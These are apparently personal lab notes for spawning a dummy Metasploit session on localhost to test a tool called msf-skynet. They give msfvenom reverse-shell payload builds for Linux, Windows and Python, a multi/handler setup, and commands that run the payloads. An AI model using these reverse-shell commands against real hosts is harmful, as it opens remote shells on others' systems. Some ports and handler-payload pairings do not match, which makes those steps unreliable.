---
title: Dummy session for msfconsole
tags:
  - notes
date: 2025-11-19
---
## 1. Start msgrpc (required for msf-skynet)

```bash
msfconsole -q -x "load msgrpc Pass=secret ServerPort=55552 ServerHost=127.0.0.1"
```

You’ll see:
```bash
[*] MSGRPC Service: 127.0.0.1:55553
[*] Successfully loaded plugin: msgrpc
```

Leave this terminal running.

## 2. Set Up a Handler in the Same msfconsole

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 127.0.0.1
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j
```

Output:
```
[*] Started reverse TCP handler on 127.0.0.1:4444
```

Handler is now waiting in background.

## 3. Create Payload with msfvenom

### Linux (x64 shell)
```bash
msfvenom -p linux/x64/shell_reverse_tcp \
         LHOST=127.0.0.1 LPORT=4444 \
         -f elf > /tmp/dummy.elf
```

### Windows (Meterpreter)
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=127.0.0.1 LPORT=4444 \
         -f exe > /tmp/dummy.exe
```

### Python (no file needed)
```bash
msfvenom -p python/meterpreter/reverse_tcp \
         LHOST=127.0.0.1 LPORT=4444 \
         -f raw
```

## 4. Execute the Payload (creates real session)

### Linux ELF
```bash
chmod +x /tmp/dummy.elf
timeout 30 /tmp/dummy.elf &
# → Session 1 opens instantly
```

### Windows EXE (on Kali/NixOS with Wine)
```bash
wine /tmp/dummy.exe &
# → Meterpreter session 1
```

### Python one-liner (no file)
```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw | timeout 30 python3 -
```

## 5. Verify & Kill with msf-skynet

```bash
./msf-skynet session list
# → shows session 1

./msf-skynet session kill 1
# → Session stopped successfully
```

## One-Command Demo (handler + payload)

```bash
msfconsole -q -x "load msgrpc Pass=abc123 ServerPort=55553; use multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit -j" & \
sleep 3 && msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf > /tmp/x && chmod +x /tmp/x && timeout 30 /tmp/x &
```

Now just run:
```bash
./msf-skynet session list
./msf-skynet session kill 1
```

